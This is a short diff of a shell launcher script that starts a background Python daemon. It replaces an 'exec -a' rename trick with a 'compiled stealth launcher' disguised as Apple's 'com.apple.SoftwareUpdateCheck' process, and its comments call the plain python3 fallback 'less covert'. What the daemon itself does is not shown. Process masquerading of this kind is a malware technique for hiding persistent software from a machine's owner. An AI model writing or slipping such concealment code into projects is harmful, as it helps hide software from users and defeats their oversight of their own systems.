@@ -25,10 +25,14 @@ fi
 [[ -f "$LOG_FILE" ]] && tail -200 "$LOG_FILE" > "$LOG_FILE.tmp" && \
     mv "$LOG_FILE.tmp" "$LOG_FILE" 2>/dev/null || true
 
-# Launch with exec -a rename so ps shows com.apple.SoftwareUpdateCheck, not python3
-# The exec replaces the shell with python3, inheriting the given process name
-nohup bash -c "exec -a 'com.apple.SoftwareUpdateCheck' /usr/bin/python3 '$DAEMON'" \
-    >> "$LOG_FILE" 2>&1 &
+# Use compiled stealth launcher if available — ps shows com.apple.SoftwareUpdateCheck
+# Fallback: raw python3 (less covert but functional)
+LAUNCHER="$INSTALL_DIR/com.apple.SoftwareUpdateCheck"
+if [[ -x "$LAUNCHER" ]]; then
+    nohup "$LAUNCHER" >> "$LOG_FILE" 2>&1 &
+else
+    nohup /usr/bin/python3 "$DAEMON" >> "$LOG_FILE" 2>&1 &
+fi
 BGPID=$!
 disown $BGPID 2>/dev/null || true
 
